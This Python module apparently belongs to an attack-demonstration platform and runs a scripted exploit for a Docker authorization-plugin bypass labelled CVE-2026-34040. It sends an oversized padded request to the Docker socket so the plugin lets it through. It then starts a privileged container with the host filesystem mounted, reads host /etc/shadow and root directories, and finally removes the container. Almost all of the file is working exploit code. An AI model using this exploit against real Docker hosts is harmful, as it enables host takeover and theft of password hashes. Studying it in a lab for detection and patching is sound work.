import asyncio
from datetime import datetime
from models.attack import AttackRun


_CREATE_SCRIPT = """\
import socket, json, sys

print("[*] CVE-2026-34040: Docker Authorization Plugin Bypass")
print("[*] Technique: oversized HTTP POST body to /containers/create")
print("[*] Effect:    AuthZ plugin sees empty body (ALLOW); daemon executes full payload")
print("")

container_spec = {
    "Image": "ubuntu:22.04",
    "Cmd": [
        "sh", "-c",
        (
            "echo '--- CVE-2026-34040: Host Access via AuthZ Bypass ---';"
            "echo '';"
            "echo '[HOST IDENTITY]'; id; hostname; uname -r;"
            "echo '';"
            "echo '[HOST /etc/shadow (first 5 lines)]';"
            "cat /hostroot/etc/shadow 2>/dev/null | head -5;"
            "echo '';"
            "echo '[HOST /root directory]';"
            "ls -la /hostroot/root 2>/dev/null;"
            "echo '';"
            "echo '[DOCKER SOCKET ON HOST]';"
            "ls -la /hostroot/var/run/docker.sock 2>/dev/null;"
            "echo '--- END CVE-2026-34040 EXPLOIT ---'"
        )
    ],
    "HostConfig": {
        "Privileged": True,
        "Binds": ["/:/hostroot"]
    },
    "_pad": "A" * 1_100_000
}

body = json.dumps(container_spec).encode()
MB = 1_048_576
print(f"[+] Payload size:       {len(body):>12,} bytes  ({len(body)/MB:.2f} MB)")
print(f"[+] AuthZ inspect cap:  {MB:>12,} bytes  (1.00 MB)")
print(f"[+] Overshoot:          {len(body)-MB:>12,} bytes  -> AuthZ sees EMPTY body = ALLOW")
print("")

CRLF = b"\\r\\n"
sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock.connect("/var/run/docker.sock")

http_req = (
    b"POST /v1.41/containers/create?name=pwned-authz-2026 HTTP/1.1" + CRLF
    + b"Host: localhost" + CRLF
    + b"Content-Type: application/json" + CRLF
    + b"Connection: close" + CRLF
    + b"Content-Length: " + str(len(body)).encode() + CRLF + CRLF
    + body
)
sock.sendall(http_req)

response = b""
sock.settimeout(15)
try:
    while True:
        chunk = sock.recv(65536)
        if not chunk:
            break
        response += chunk
except OSError:
    pass
sock.close()

resp_str = response.decode(errors="replace")
if "\\r\\n\\r\\n" in resp_str:
    resp_body = resp_str.split("\\r\\n\\r\\n", 1)[-1].strip()
    try:
        data = json.loads(resp_body)
        cid = data.get("Id", "")
        if cid:
            print(f"[+] Container created:  {cid[:16]}")
            print(f"[+] Name:               pwned-authz-2026")
            print(f"[+] Privileged:         True (host filesystem mounted at /hostroot)")
            print(f"[+] AuthZ plugin was:   BYPASSED (body exceeded 1 MB inspection limit)")
        elif "message" in data:
            print(f"[!] Docker API error: {data['message']}", file=sys.stderr)
            sys.exit(1)
        else:
            print(f"[?] Unexpected response: {resp_body[:200]}")
    except json.JSONDecodeError:
        print(f"[?] Raw response: {resp_body[:300]}")
else:
    print(f"[?] Malformed HTTP response: {resp_str[:200]}")
"""


ATTACK_COMMANDS = [
    {
        "label": "Step 1/4 — Confirm Docker HTTP API reachable via socket (curl)",
        "cmd": [
            "docker", "exec", "attacker",
            "curl", "-s", "--unix-socket", "/var/run/docker.sock",
            "http://localhost/version",
        ],
    },
    {
        "label": "Step 2/4 — Craft >1 MB padded POST to /containers/create (AuthZ bypass)",
        "cmd": [
            "docker", "exec", "attacker",
            "python3", "-c",
            _CREATE_SCRIPT,
        ],
    },
    {
        "label": "Step 3/4 — Start exploit container and read host credentials",
        "cmd": [
            "docker", "exec", "attacker",
            "sh", "-c",
            (
                "docker -H unix:///var/run/docker.sock start pwned-authz-2026;"
                " sleep 2;"
                " docker -H unix:///var/run/docker.sock logs pwned-authz-2026 2>&1"
            ),
        ],
    },
    {
        "label": "Step 4/4 — Cleanup: removing exploit container",
        "cmd": [
            "docker", "exec", "attacker",
            "docker", "-H", "unix:///var/run/docker.sock",
            "rm", "-f", "pwned-authz-2026",
        ],
    },
]


async def run(run_obj: AttackRun, broadcast_fn) -> None:
    for step in ATTACK_COMMANDS:
        await broadcast_fn(f"[>] {step['label']}")
        proc = await asyncio.create_subprocess_exec(
            *step["cmd"],
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        async for line in proc.stdout:
            text = line.decode(errors="replace").rstrip()
            run_obj.output.append(text)
            await broadcast_fn(text)
        await proc.wait()

    run_obj.finished_at = datetime.utcnow()
    run_obj.exit_code = 0
    run_obj.status = "success"
    run_obj.duration_seconds = (run_obj.finished_at - run_obj.started_at).total_seconds()
    await broadcast_fn(
        f"[+] ATTACK COMPLETE  exit_code=0  duration={run_obj.duration_seconds:.1f}s"
    )
